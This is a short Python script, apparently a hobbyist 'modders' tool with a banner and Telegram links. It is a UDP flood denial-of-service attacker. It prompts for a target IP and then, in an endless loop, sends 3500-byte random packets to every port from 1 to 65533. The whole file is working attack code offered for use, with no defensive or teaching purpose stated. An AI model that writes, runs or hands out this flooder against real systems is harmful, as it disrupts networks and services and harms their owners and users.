#Powered By XinnClay Modders'
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print(" ")
print(" __  ___              ____ _             ")
print(" \ \/ (_)_ __  _ __  / ___| | __ _ _   _ ")
print("  \  /| | '_ \| '_ \| |   | |/ _` | | | |")
print("  /  \| | | | | | | | |___| | (_| | |_| |")
print(" /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |")
print("                                   |___/ ")
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : XinnClay Modders" + N + "   YouTube - " + B + "" + R + "XinnClay Modders" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : XinnClay Modders\033[0m")
print("\033[33mTele    	    : https://t.me/XinnClay_Fixxed\033[0m")
print("\033[33mCh Tele         : https://t.me/XinnClayFixxed\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Target's IP : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
